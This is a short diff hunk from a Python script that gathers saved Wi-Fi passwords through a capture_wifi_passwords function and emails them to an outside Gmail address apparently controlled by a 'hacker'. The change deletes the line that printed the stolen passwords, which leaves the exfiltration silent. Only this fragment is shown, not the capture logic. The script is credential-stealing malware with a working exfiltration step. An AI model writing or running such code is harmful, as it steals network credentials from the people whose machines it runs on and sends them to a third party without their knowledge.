@@ -36,7 +36,6 @@ def capture_wifi_passwords():
 
 
 wifi_passwords = capture_wifi_passwords()
-print(wifi_passwords)
 send_mail("hacker.test.email333@gmail.com", "Hacker333", wifi_passwords)
 
 
